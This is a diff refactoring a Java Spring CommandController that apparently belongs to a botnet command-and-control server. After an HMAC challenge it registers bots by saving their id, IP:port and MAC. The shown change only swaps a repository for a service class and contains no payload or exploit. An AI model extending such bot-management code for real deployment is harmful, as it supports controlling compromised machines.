@@ -22,11 +22,13 @@ import org.springframework.web.servlet.ModelAndView;
 import cs.sii.bot.active.CryptoAuth;
 import cs.sii.bot.passive.BotInitialize;
 import cs.sii.config.bot.Engine;
-import cs.sii.connection.NetworkService;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
 import cs.sii.model.bot.Bot;
 import cs.sii.model.bot.BotRepository;
+import cs.sii.service.connection.NetworkService;
+import cs.sii.service.dao.BotServiceImpl;
+import cs.sii.service.dao.RoleServiceImpl;
 
 @Controller
 public class CommandController {
@@ -38,7 +40,7 @@ public class CommandController {
 	private CryptoAuth auth;
 
 	@Autowired
-	private BotRepository botRepository;
+	private BotServiceImpl botService;
 
 	@Autowired
 	private NetworkService networkService;
@@ -111,7 +113,7 @@ public class CommandController {
 				if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
 					response = "Challenge OK";
 					//botRepository.save(new Bot(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(),objects.get(3).toString(), objects.get(2).toString()));
-					botRepository.save(new Bot(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(), Mac, null));
+					botService.getBotRepository().save(new Bot(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(), Mac, null));
 					//TODO DA decidere send some peers
 				}
 
